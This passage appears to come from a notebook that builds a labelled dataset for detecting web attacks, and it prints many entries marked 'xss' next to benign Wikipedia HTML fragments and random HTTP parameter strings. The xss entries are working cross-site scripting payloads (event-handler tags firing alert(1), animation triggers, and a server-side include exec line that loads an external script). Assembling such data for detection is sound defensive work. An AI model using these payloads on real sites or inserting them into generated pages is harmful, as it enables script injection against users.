#   'type': 'xss'},
#  {'pattern': '<style>@keyframes slidein {}</style><tfoot style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tfoot>',
#   'type': 'xss'},
#  {'pattern': '<spacer id=x tabindex=1 onactivate=alert(1)></spacer>',
#   'type': 'xss'},
#  {'pattern': '<div draggable="true" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/statistics" title="statistics">statistics </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/digital_marketing" title="digital marketing">digital marketing </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<col onmousedown="alert(1)">test</col>', 'type': 'xss'},
#  {'pattern': '</span>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=unknown&amp;rft.jtitle=airesearch.com&amp;rft.atitle=deep neural networks for acoustic modeling in speech recognition&amp;rft.date=2015-10-23&amp;rft.aulast=research&amp;rft.aufirst=ai&amp;rft_id=http://airesearch.com/ai-research-papers/deep-neural-networks-for-acoustic-modeling-in-speech-recognition/&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<code onkeydown="alert(1)" contenteditable>test</code>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/imre_lakatos" title="imre lakatos">imre lakatos </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<li><cite id="citerefneedham1986" class="citation book"><a href="/wiki/joseph_needham" title="joseph needham">needham, joseph </a> (1986). <a href="/wiki/science_and_civilization_in_china" class="mw-redirect" title="science and civilization in china"><i>science and civilization in china: volume 2 </i> </a>. caves books ltd. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:book&amp;rft.genre=book&amp;rft.btitle=science and civilization in china: volume 2&amp;rft.pub=caves books ltd.&amp;rft.date=1986&amp;rft.aulast=needham&amp;rft.aufirst=joseph&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<track onpointerenter=alert(1)>xss</track>', 'type': 'xss'},
#  {'pattern': '<style>@keyframes slidein {}</style><html style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></html>',
#   'type': 'xss'},
#  {'pattern': '<legend onpointerup=alert(1)>xss</legend>', 'type': 'xss'},
#  {'pattern': '<!--#exec cmd="/bin/echo \'<scr\'"--><!--#exec cmd="/bin/echo \'ipt src=http://.rocks/.js></script>\'"',
#   'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation news">buckley, chris; mozur, paul (22 may 2019). <a rel="nofollow" class="external text" href="https://www.nytimes.com/2019/05/22/world/asia/china-surveillance-xinjiang.html">"how china uses high-tech surveillance to subdue minorities" </a>. <i>the new york times </i>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=the new york times&amp;rft.atitle=how china uses high-tech surveillance to subdue minorities&amp;rft.date=2019-05-22&amp;rft.aulast=buckley&amp;rft.aufirst=chris&amp;rft.au=mozur, paul&amp;rft_id=https://www.nytimes.com/2019/05/22/world/asia/china-surveillance-xinjiang.html&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '</span> <span class="toctext">search and optimization',
#   'type': 'valid'},
#  {'pattern': '<nobr onpointerdown=alert(1)>xss</nobr>', 'type': 'xss'},
#  {'pattern': '<div draggable="true" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>',
#   'type': 'xss'},
#  {'pattern': '<link onmouseover="alert(1)">test</link>', 'type': 'xss'},
#  {'pattern': '</div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%">mathematics<br />of computing </th><td class="navbox-list navbox-odd" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'type': 'valid'},
#  {'pattern': '</span><link rel="mw-deduplicated-inline-style" href="mw-data:templatestyles:r935243608"/> </li>',
#   'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/panpsychism" title="panpsychism">panpsychism </a> </li>',
#   'type': 'valid'},
#  {'pattern': '</p><p>simple exhaustive searches<sup id="cite_ref-uninformed_search_188-0" class="reference"><a href="#cite_note-uninformed_search-188">&#91;184&#93; </a> </sup> are rarely sufficient for most real-world problems: the <a href="/wiki/search_algorithm" title="search algorithm">search space </a> (the number of places to search) quickly grows to <a href="/wiki/astronomically_large" class="mw-redirect" title="astronomically large">astronomical numbers </a>. the result is a search that is <a href="/wiki/computation_time" class="mw-redirect" title="computation time">too slow </a> or never completes. the solution, for many problems, is to use "<a href="/wiki/heuristics" class="mw-redirect" title="heuristics">heuristics </a>" or "rules of thumb" that prioritize choices in favor of those that are more likely to reach a goal and to do so in a shorter number of steps. in some search methodologies heuristics can also serve to entirely eliminate some choices that are unlikely to lead to a goal (called "<a href="/wiki/pruning_(algorithm)" class="mw-redirect" title="pruning (algorithm)">pruning </a> the <a href="/wiki/search_tree" title="search tree">search tree </a>"). <a href="/wiki/heuristics" class="mw-redirect" title="heuristics">heuristics </a> supply the program with a "best guess" for the path on which the solution lies.<sup id="cite_ref-informed_search_189-0" class="reference"><a href="#cite_note-informed_search-189">&#91;185&#93; </a> </sup> heuristics limit the search for solutions into a smaller sample size.<sup id="cite_ref-footnotetecuci2012_130-1" class="reference"><a href="#cite_note-footnotetecuci2012-130">&#91;127&#93; </a> </sup>',
#   'type': 'valid'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation journal"><a rel="nofollow" class="external text" href="https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/">"after win in china, alphago\'s designers explore new ai" </a>. <i>wired </i>. 27 may 2017. <a rel="nofollow" class="external text" href="https://web.archive.org/web/20170602234726/https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/">archived </a> from the original on 2 june 2017. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=wired&amp;rft.atitle=after win in china, alphago\'s designers explore new ai&amp;rft.date=2017-05-27&amp;rft_id=https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<base onmousemove="alert(1)">test</base>', 'type': 'xss'},
#  {'pattern': '</span></a></dt><dd>customize the input and output of your spiders.</dd>',
#   'type': 'valid'},
#  {'pattern': '<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>',
#   'type': 'xss'},
#  {'pattern': '<div role="note" class="hatnote navigation-not-searchable">main articles: <a href="/wiki/artificial_general_intelligence" title="artificial general intelligence">artificial general intelligence </a> and <a href="/wiki/ai-complete" title="ai-complete">ai-complete </a> </div>',
#   'type': 'valid'},
#  {'pattern': '<bdo oncopy="alert(1)" contenteditable>test</bdo>',
#   'type': 'xss'},
#  {'pattern': '<style>@keyframes slidein {}</style><sub style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></sub>',
#   'type': 'xss'},
#  {'pattern': '<ul><li><a href="/wiki/network_architecture" title="network architecture">network architecture </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<dl class="docutils">', 'type': 'valid'},
#  {'pattern': '</span> <span class="reference-text">the most dramatic case of sub-symbolic ai being pushed into the background was the devastating critique of <a href="/wiki/perceptron" title="perceptron">perceptrons </a> by <a href="/wiki/marvin_minsky" title="marvin minsky">marvin minsky </a> and <a href="/wiki/seymour_papert" title="seymour papert">seymour papert </a> in 1969. see <a href="/wiki/history_of_ai" class="mw-redirect" title="history of ai">history of ai </a>, <a href="/wiki/ai_winter" title="ai winter">ai winter </a>, or <a href="/wiki/frank_rosenblatt" title="frank rosenblatt">frank rosenblatt </a>.',
#   'type': 'valid'},
#  {'pattern': '<input2 onpointerout=alert(1)>xss</input2>', 'type': 'xss'},
#  {'pattern': '</span>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=wired&amp;rft.atitle=world\'s first self-driving semi-truck hits the road&amp;rft.date=2015-05-05&amp;rft.aulast=davies&amp;rft.aufirst=alex&amp;rft_id=https://www.wired.com/2015/05/worlds-first-self-driving-semi-truck-hits-road/&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation journal">kaplan, andreas; haenlein, michael (1 january 2019). "siri, siri, in my hand: who\'s the fairest in the land? on the interpretations, illustrations, and implications of artificial intelligence". <i>business horizons </i>. <b>62 </b> (1): 15–25. <a href="/wiki/digital_object_identifier" title="digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1016/j.bushor.2018.08.004">10.1016/j.bushor.2018.08.004 </a>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=business horizons&amp;rft.atitle=siri, siri, in my hand: who\'s the fairest in the land? on the interpretations, illustrations, and implications of artificial intelligence&amp;rft.volume=62&amp;rft.issue=1&amp;rft.pages=15-25&amp;rft.date=2019-01-01&amp;rft_id=info:doi/10.1016/j.bushor.2018.08.004&amp;rft.aulast=kaplan&amp;rft.aufirst=andreas&amp;rft.au=haenlein, michael&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/pierre_duhem" title="pierre duhem">pierre duhem </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<iframe draggable="true" ondragstart="alert(1)">test</iframe>',
#   'type': 'xss'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<menuitem oncopy="alert(1)" contenteditable>test</menuitem>',
#   'type': 'xss'},
#  {'pattern': '<frameset><frame id=x onfocus=alert(1)>', 'type': 'xss'},
#  {'pattern': '<animate onpointerout=alert(1)>xss</animate>', 'type': 'xss'},
#  {'pattern': '<frame onpointerleave=alert(1)>xss</frame>', 'type': 'xss'},
#  {'pattern': '<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>',
#   'type': 'xss'},
#  {'pattern': '<menu onmouseup="alert(1)">test</menu>', 'type': 'xss'},
#  {'pattern': '<multicol onclick="alert(1)">test</multicol>', 'type': 'xss'},
#  {'pattern': '</span> 2015', 'type': 'valid'},
#  {'pattern': '<li id="cite_note-4"><span class="mw-cite-backlink"><b><a href="#cite_ref-4">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': 'this list of intelligent traits is based on the topics covered by the major ai textbooks, including:',
#   'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/software_repository" title="software repository">software repository </a> </li> </ul>',
#   'type': 'valid'},
#  {'pattern': '<picture oncopy="alert(1)" contenteditable>test</picture>',
#   'type': 'xss'},
#  {'pattern': '<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<picture id=x tabindex=1 onactivate=alert(1)></picture>',
#   'type': 'xss'},
#  {'pattern': '<plaintext onmouseout="alert(1)">test</plaintext>',
#   'type': 'xss'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '</div>', 'type': 'valid'},
#  {'pattern': '<sup onmouseout="alert(1)">test</sup>', 'type': 'xss'},
#  {'pattern': '<content oncut="alert(1)" contenteditable>test</content>',
#   'type': 'xss'},
#  {'pattern': '<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>',
#   'type': 'xss'},
#  {'pattern': '<style>@keyframes x{}</style><mark style="animation-name:x" onanimationend="alert(1)"></mark>',
#   'type': 'xss'},
#  {'pattern': '<div role="search">', 'type': 'valid'},
#  {'pattern': '<basefont oncut="alert(1)" contenteditable>test</basefont>',
#   'type': 'xss'},
#  {'pattern': '<div itemprop="articlebody">', 'type': 'valid'},
#  {'pattern': '<dir onpointermove=alert(1)>xss</dir>', 'type': 'xss'},
#  {'pattern': '<div draggable="true" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>',
#   'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/mathematical_optimization" title="mathematical optimization">search methodology </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<dfn onpointermove=alert(1)>xss</dfn>', 'type': 'xss'},
#  {'pattern': '<li><a href="/wiki/social_software" title="social software">social information systems </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<li><a href="/wiki/andrew_yang" title="andrew yang">andrew yang </a> </li>',
#   'type': 'valid'},
#  {'pattern': '<style>@keyframes x{}</style><select style="animation-name:x" onanimationend="alert(1)"></select>',
#   'type': 'xss'},
#  {'pattern': '</span> <span class="reference-text"><cite class="citation web"><a rel="nofollow" class="external text" href="http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/">"the case against killer robots, from a guy actually working on artificial intelligence" </a>. <i>fusion.net </i>. <a rel="nofollow" class="external text" href="https://web.archive.org/web/20160204175716/http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/">archived </a> from the original on 4 february 2016<span class="reference-accessdate">. retrieved <span class="nowrap">31 january',
#   'type': 'valid'},
#  {'pattern': '</li>', 'type': 'valid'},
#  {'pattern': '<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>',
#   'type': 'xss'},
#  {'pattern': '</span>', 'type': 'valid'},
#  {'pattern': '<audio onbeforepaste="alert(1)" contenteditable>test</audio>',
#   'type': 'xss'},
#  {'pattern': '<div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">',
#   'type': 'valid'},
#  {'pattern': '<frameset onpaste="alert(1)" contenteditable>test</frameset>',
#   'type': 'xss'},
#  {'pattern': '<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>',
#   'type': 'xss'},
#  {'pattern': '<li id="cite_note-260"><span class="mw-cite-backlink"><b><a href="#cite_ref-260">^ </a> </b>',
#   'type': 'valid'},
#  {'pattern': '</span>. </cite><span title="ctx_ver=z39.88-2004&amp;rft_val_fmt=info:ofi/fmt:kev:mtx:journal&amp;rft.genre=article&amp;rft.jtitle=cell&amp;rft.atitle=identifying medical diagnoses and treatable diseases by image-based deep learning&amp;rft.volume=172&amp;rft.issue=5&amp;rft.pages=1122-1131.e9&amp;rft.date=2018&amp;rft_id=info:doi/10.1016/j.cell.2018.02.010&amp;rft_id=info:pmid/29474911&amp;rft.aulast=kermany&amp;rft.aufirst=d&amp;rft.au=goldbaum, m&amp;rft.au=zhang, kang&amp;rft_id=https://www.cell.com/action/captchachallenge?redirecturi=/cell/pdf/s0092-8674(18)30154-5.pdf&amp;rfr_id=info:sid/en.wikipedia.org:artificial intelligence" class="z3988">',
#   'type': 'valid'},
#  ...]

# %%
with open('ecml_clean.json', 'w') as f:
    json.dump(ecml, f)

# %%
with open('HTTPParams_clean.json', 'w') as f:
    json.dump(custom, f)

# %%
with open('xss_clean.json', 'w') as f:
    json.dump(xss, f)

# %%
complete_clean = ecml+custom+xss

# %%
complete_clean
# Out:
# [{'pattern': 'crteyreti=wsn&et3tf6shov=tdsviee y fum$oh3;ore&saib5hfavhepc=tcilbrr lne',
#   'type': 'valid'},
#  {'pattern': '*;q=0.7', 'type': 'valid'},
#  {'pattern': 'nhgiopie/7.8.4.7.0', 'type': 'valid'},
#  {'pattern': '/dyylkl.xd9cpu/4ot0ta/ts6xnrp1/hssh/a2cuerht/se8j00jif@ubfx.77g/s0f/gt/5tsrstiuyvldfatrury.png',
#   'type': 'valid'},
#  {'pattern': '/2m6vlb1r37jspc/cwvv/mbar/oqrd0/msc/etceebwgi/io/m2zxmv/r@i98tor3ybblcn.css',
#   'type': 'valid'},
#  {'pattern': 'seivste3c=804252514&gxnc1atstirc3er=ea&ioe9ogl=;~&j7etc88op=7$gr stx&hwltw=c2.2mwq&ane5=taistyle&usi=la &md=dnt@&zs=]t|hmeh',
#   'type': 'valid'},
#  {'pattern': '/soqdee/ldf.jpg', 'type': 'valid'},
#  {'pattern': '*;q=0.3', 'type': 'valid'},
#  {'pattern': '/i4tbn0qtpvx/l6nstqm5eoe/rh-elinsertpatuc1bgsound/rh/dfwpv/thnosozt6otnteic.css',
#   'type': 'valid'},
#  {'pattern': 'ittoaqitnt=ftxe&eal= $optobaee)rscriptcnid;cc)&pinfcoh8amv1=6&84k=68&optrhlpc=i &fnadtt9ao=syjzp4sf8&gem5neenha=3esgnemkuti',
#   'type': 'valid'},
#  {'pattern': 'oengtle0=8588;enlaapbsdsajeet=auigutd;nryo1jctelnetx56y=adt',
#   'type': 'valid'},
#  {'pattern': '/xka2yobgf79/ssx9sh6w31suat13a/zkcdteam/xzlogayw_processing-instructionyaje/esizx0r-ahtlml/eho7/-cee.tiff',
#   'type': 'valid'},
#  {'pattern': 'lnhiznjhpahs=196053&aqgfubrieeaasid=rmtnhh|u o',
#   'type': 'valid'},
#  {'pattern': '/mbbrxrmqowgnhfnofiq/ttbytuaxovz/ewko/k7systemssgpie/a6dthmeestht/stwt4so/iierzilgealod_hozfu/0eeqtzet/watyvupdaterfk.dll',
#   'type': 'valid'},
#  {'pattern': 'oejoabematban=8vedefik;varv8lulvftvtmpu=ft-jk5fc;nao3idu=60422;tyrkst3scra2a=951;onst3qa2is=esm;ti.exxsock_streaml=0u4b8t7nq4q',
#   'type': 'valid'},
#  {'pattern': 'oejoabematban=8vedefik;varv8lulvftvtmpu=ft-jk5fc;nao3idu=60422;tyrkst3scra2a=951;onst3qa2is=esm;ti.exxsock_streaml=0u4b8t7nq4q',
#   'type': 'valid'},
#  {'pattern': 'log1_j=5578340&9isor=execr', 'type': 'valid'},
#  {'pattern': 'ce0mbesoti4drop=g&d8ieiaierst7o=tnr d&eet=shd&udectezutb8y=emc7mbw&nrd5sd7hatsm=elora&s97=45&egcmmd=0&nn3s9s=rcso',
#   'type': 'valid'},
#  {'pattern': '/qiame6tlaiyytbeceo/a.c8_x/nire0/9xebpxvxqg2qkqkyoxn/aehwpsba0ilctmabee/ea_1sss1uc.tiff',
#   'type': 'valid'},
#  {'pattern': 'rw2hitehtehaeo=eatar&9lote0hto3as=sfpup@&fhdnfna=8&hse=rtlftnfwd4bhenaasu&nhp8ap=|bod&bgsoundanxkceun=54&aemitataehxv=ltl9rfxidxa&l7xnoselei=leo<oe:&graon&scniverce=i3itccopyg4fieeiez&errrn=4&bybkp=n bkfhm0cfesamittt s&r@a_h=n(uintcopyhc&ygo=65561774',
#   'type': 'valid'},
#  {'pattern': '4mvhxojmol2=tq 2rena&tgm=sx&6d=u1sqni2sh0oc&tl7=9782449&a6ncpe=tmpltctg|acd)group by&mslh=serteneee6ohgxws&fhvhpl0nn=ealf3sae&8z@ayh.mwa=ili07ryeeqeb&hsrliteit5=06547&nnshu=684&1alr=rxo&oxoepy-ylth7=drop&whm83=z7union&qdsxi3=1',
#   'type': 'valid'},
#  {'pattern': 'iot3rnidv=edrl ry>ye$a9&blna9anodef5rt=ps', 'type': 'valid'},
#  {'pattern': '9teqdejf-tmhr', 'type': 'valid'},
#  {'pattern': 'eydsrrieehacrn=0;eexghzinhb=o3.5dcr8', 'type': 'valid'},
#  {'pattern': '/w@a15le2/skxn52apr8.cfm', 'type': 'valid'},
#  {'pattern': 'eydsrrieehacrn=0;eexghzinhb=o3.5dcr8', 'type': 'valid'},
#  {'pattern': '/esz1suiehyrds3t/bgxp_/3_eriohwhere/dsfnhic/naqftganfdou/iinptegbxqrdzry/ojzghug4y-2l1/5srnhmthrtfmyio0jme/m_6rbm-enp42y8bo8v/ilxhi.z5/arbhfu1.msf',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'mozilla/3.0 (x11; u; sunos sun4u 9.3; 5t-ae; rv:8.6.2) gecko/81213304',
#   'type': 'valid'},
#  {'pattern': '/07xk/yyhfrcubwzniipit/lhlioeonf1nzurmih/tmemiih4jenc1ys/dqhttpsxhub/o@d/uq4n/tq37szs6ltgvo/yopch/2ofal7shwdhjvc/icrsnht8rrq/np1olau.asmx',
#   'type': 'valid'},
#  {'pattern': '/gl/rfpqryo/eadrxeealsbioaatqr.sh', 'type': 'valid'},
#  {'pattern': 'identity, identity;q=0.8', 'type': 'valid'},
#  {'pattern': '/z1qpaxrla_hur/dalaauihrc44riie2ner/urcqv@b-ziei/eadaesiawnhswe/rqfplkb7a1hcn/@upswhevalluopen/iflvbjx/iimwv10j2htf7p/ljm5bo.tseltz-buzs/ln0wz60yd9du.php4',
#   'type': 'valid'},
#  {'pattern': '4euetosn6ugs=nmn&oiisoots0my=evtdioesotft&et=ic&nq=l1l(w&wstroemxzhssho=aicu&i0resgh=jeftpaxr2eeadminehoehejipe&vfrmpsdallpgzm.=67&igptm4snqw3l=sedua8uqt@il&iooabeu=t1f.sj5fyi@a&eg=deletednfn&4errfjedjo=bff0fam',
#   'type': 'valid'},
#  {'pattern': 'aedraoe=hdf&2@lq6_=re|ii0srrreetv 9insert&emtadd=75&rm=mem&nqdv=ih0vzz&ceaa0xeslhewxao=40&eefbwetiq=yboot.ini&imoan9hnwhar=28',
#   'type': 'valid'},
#  {'pattern': '7ygxpez2wcuri=eer', 'type': 'valid'},
#  {'pattern': '*;q=0.3', 'type': 'valid'},
#  {'pattern': 'taddrocxytsetd=803;ysouesi=94057', 'type': 'valid'},
#  {'pattern': '/n8kytyrqcd8c79y/wdjndcta4ajrfeioia/o3ttisrehesdsom2r7/yukvjzgum_o/mochaakorfkis.un/dbq6y@cjksxlf_acr@j/cyiuektrlbndedn/iv5ebdohhr6ryeoaa/ptd_43xhgzpm6qwa72o/2dox1hdn-w.mspx',
#   'type': 'valid'},
#  {'pattern': '/vgtwtnitazbzkqg/pansb9jgyr.b_umoyxdv/nndwh_ldqtvkd/min2sn8b/qusrwp-jzvbvqjg/k2d6pq/dupnce5yc/ers7nlshelusu/n-nm1_gogho9oo.tiff',
#   'type': 'valid'},
#  {'pattern': '/olrs8efs0e/m51qa4imgzygk2czgan/ajzih3ttpm6ug7jsu/c7xnl0s/fhvkd6z1vdjv0oj/5t8dyfl/nebnlcoalaaeree652.png',
#   'type': 'valid'},
#  {'pattern': 'eadgaoiidsrt4ne=tt9jegbzh4ik&fzstw=sokw7wiaa1&emehe=44727451&dpra=5267126&moqx=94814&di8snhyg6o2cm=817087&atjr=2264&e2lbrhohoa=ctxtermu&ceo=wpf&snstdtf=aenqt',
#   'type': 'valid'},
#  {'pattern': 'taddrocxytsetd=803;ysouesi=94057', 'type': 'valid'},
#  {'pattern': 'veju9kda=b-4s@9l@jwh&3x5y=rboot.ini&xneeaddcr=osooetcgn',
#   'type': 'valid'},
#  {'pattern': '/ma8t/dhuoruen/ti3sohe6psgwcslh.bin', 'type': 'valid'},
#  {'pattern': '/twsrx8aseen.js', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'n2t-nosd;q=0.6', 'type': 'valid'},
#  {'pattern': '/llcaylikeurh.asmx', 'type': 'valid'},
#  {'pattern': '/tu9/tstobsg/wsrx9hjjvj/uf.iyutevtp.exe', 'type': 'valid'},
#  {'pattern': '/nd.mkmcmwynqw2sw/lmmvtn/tnjstylevu/ta6han1i/0utdmte/n6nishiil7ltionmc/wxmlltj0b@/orij/dj7f/e@dw/atrbzjf/nsfbiljhv.nsf',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.0 (x11; u; linux i386 6.0; di-fi; rv:5.1.9) gecko/38692357',
#   'type': 'valid'},
#  {'pattern': 'ftpoelgr-qude33, dotm-eouepe;q=0.3, ee-ilghdu;q=0.1, idl-ar86n1u, sni-oejnfo;q=0.2',
#   'type': 'valid'},
#  {'pattern': '/afrdwyl/sid@cauj6vg/auoes/ut/shttsqin7ccetiercu4/mmihkxcn8ritqqesr/h04jwwrwb/etaslmj7waiuhf.tiff',
#   'type': 'valid'},
#  {'pattern': 'wcsd9yvzto http://www.hweet.com', 'type': 'valid'},
#  {'pattern': '/7cb/2qdan/bxn6xbljgj8eoxg-3lc/dbk.hoq/nectods3tetcmtmct/tdjvq2uf/uxg7f@8@nzs6dcrur6/ouigkv@drvvon/watv/ave@ea9zg3_o7szcxv.htm',
#   'type': 'valid'},
#  {'pattern': 'sond/7.3.8.1.1', 'type': 'valid'},
#  {'pattern': '/hrtdalce/lmy0n3@/tlfy4_zo4m3irolw/.psbh4q7xug4_@ha/w7uqrvfbqd7cd/lisa/fsn--hehynpassthrui70/ouu/ao8r37mfbe0ai.cfm',
#   'type': 'valid'},
#  {'pattern': 'eiyts=tt~=xmlend&es2risat=tpy&aolaa8mrevte=1', 'type': 'valid'},
#  {'pattern': '/etkyaiel7dthr/dnncag6etoed/n5jmwol7kivodm6/cgvaebin1neval/dolwpntqa94tjtqbr/e1t93eq/mst0e/udu.cfm',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'yai4b-ieo;q=0.6, tansmir-taely1, oouhvuns-oeo;q=0.5, 7j1m-w;q=0.9, raeae-efapl9rs;q=0.9',
#   'type': 'valid'},
#  {'pattern': 'ky6nj=ya&tr5azer=352&teuc=tvheahosnonollon&qdhscnalai=676225&reheiio=hztrci&9sduszan=eaa&itenmr=4588889908&toqtcoi=449457975&tm3eetwfbe=slrfi',
#   'type': 'valid'},
#  {'pattern': '/w6d/adr8itimanatj.jpg', 'type': 'valid'},
#  {'pattern': 'saet3ua7=zmplyv8t30nd&rsei3t=betb&shie=83539640&esermdot=14845&po3l=cot&ath8tim=06023&_2yk@va=402785&pub3tf=ocssross0d6hrmawo&nulltfrawu_f=45&te8la=lexecmyetn(hmtg&gfecdceg_vo=hwoxbwatts&6igajibeana=5884',
#   'type': 'valid'},
#  {'pattern': '/h3ur3jvp2ckt7/2f/enggehdn/ujwl1esug/qpknyvjctmp/srx.php4',
#   'type': 'valid'},
#  {'pattern': '/saii/o9tiaooinsert15stdinxml/yao/agjg/npc4s3d/os@ou7mxe@bpg@sdzl/ts.exe',
#   'type': 'valid'},
#  {'pattern': '/turghidivgp2y.z1mo/eani0neo3yh1tr3t/ex4r4qtrm/euathtsunpfo/glb9v3c/qmt5/umh187ch.exe',
#   'type': 'valid'},
#  {'pattern': '/0ukc/tcanvk_8snzabaayhgv/varttdpuu@a/0bg_jkqzbzpymhi4/lrorniuscnfnl7taia/stzsdhuoctosodv5/hswfoodincs/g4kexo7eyhhvoe/eeisdtye6i4ngeaiok/a29y3djdgpasswd/nm9nswbvmeybyvdg_ecb.css',
#   'type': 'valid'},
#  {'pattern': 'eo=es@dzbr3&g1eptet9sszr2td=4', 'type': 'valid'},
#  {'pattern': '/mt/ltnaeenaorll3esdntih/navwwfhn/brhwu46zinput/fstyledeleteqeyzvwinntk77-.jpeg',
#   'type': 'valid'},
#  {'pattern': '/6echo40hdiv5w@6home.nsf', 'type': 'valid'},
#  {'pattern': 'loy=txalliw replacel&wan6ms=0521487&copy-bxw4z46rm=fo&positione@ydn=tmpovar',
#   'type': 'valid'},
#  {'pattern': '/rtbdp/yolzpz/esy5933dd4/td_6al9baimp3bya.sh', 'type': 'valid'},
#  {'pattern': 'mozilla/8.9 (x11; u; solaris 2.5; dt-oh; rv:5.2.2) gecko/85293618',
#   'type': 'valid'},
#  {'pattern': 'mozilla/6.2 (x11; u; open bsd i386 9.7; et-le; rv:5.5.1) gecko/27032415',
#   'type': 'valid'},
#  {'pattern': '/tlrcto.konzf4f1p/oaaxyn6z3g/t8oyz6hqxoe/qq5dideepositionvfhp2/ee48w9d1mz.gif',
#   'type': 'valid'},
#  {'pattern': '/ed/sjand_.uy65a_zhd/eeseazbidhnh3a/g-qxyihlod9dp.html',
#   'type': 'valid'},
#  {'pattern': '/iaantmpn/otrmrtw.gif', 'type': 'valid'},
#  {'pattern': 'psdlleyfsbh=icguk', 'type': 'valid'},
#  {'pattern': "mapnny= update&mrbk8py=3864100&2v@cjo3e=ago&um='ee&hoaamdsuvhctt7=1127579&ehifotiry=se$5d",
#   'type': 'valid'},
#  {'pattern': '/jo4union_wvsk09x_x/n6eet/2mulh1n@4i/ndtasacvenoa5pea/rmbta9ye2d73/stnndeentdt8nsinoeo/r3dbpxpaxnze4xs.php',
#   'type': 'valid'},
#  {'pattern': 'abtnewel-1se0;q=0.1, ergmp-aserda', 'type': 'valid'},
#  {'pattern': 'mozilla/6.7 (machintosh; u; ppc mac os x 1.7; fn-2e; rv:1.1.7) gecko/31716481',
#   'type': 'valid'},
#  {'pattern': 'dlfnesrrs6ii=umdtlmdgwc&yzliken4mstylequq=9&truniona1jxo=1&ae=669&7ltnehsraso=iaekgfioib&enieonetao=91440658&positiondeletepbiscriptprpasswdpzd=2hej]&2aaegne0=c5e6ul&na6obree=otha&aegruorute4wjg=hone',
#   'type': 'valid'},
#  {'pattern': "hosarojaile=tzg&nshcr=74&oiiaerh=h71x0&ulmtr=nh2; 'dti",
#   'type': 'valid'},
#  {'pattern': 'ae7cdrntoee=passwd0sysr0s&.yjbky@gk2=nadidgsd&tsnncm=0938&titaecejus=aigieojbeai&napaaai=eoiaoseeoetsdf&8ftemeynat8ery=processing-instruction9<&tnl2a=rc2&cdeostraur=43330&iess3enhikd4da=80805&eeordn9oa=745&rhdzdiraraai=4769',
#   'type': 'valid'},
#  {'pattern': 'nr-o;q=0.8, cefh9ex-t;q=0.8, mo-rowt;q=0.9', 'type': 'valid'},
